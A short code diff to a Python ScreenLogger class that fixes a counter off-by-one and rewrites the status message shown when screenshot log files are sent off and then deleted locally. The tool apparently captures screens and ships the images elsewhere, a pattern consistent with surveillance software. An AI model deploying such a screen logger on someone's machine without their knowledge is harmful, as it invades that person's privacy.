@@ -25,8 +25,8 @@ class ScreenLogger:
 
     def increment_and_check_counter(self):
         self.counter += 1
-        if self.counter > self.counter_max:
-            send_log_files_in_directory(f"SENDING LOG FILES IN DIRECTORY: {self.logs_directory_path}", self.logs_directory)
+        if self.counter >= self.counter_max:
+            send_log_files_in_directory(f"`Sending screenshot logs...`", self.logs_directory)
             clear_files_in_log_directory(self.logs_directory)
             log_info("Sent and cleared screenshot log files.")
             self.counter = 0
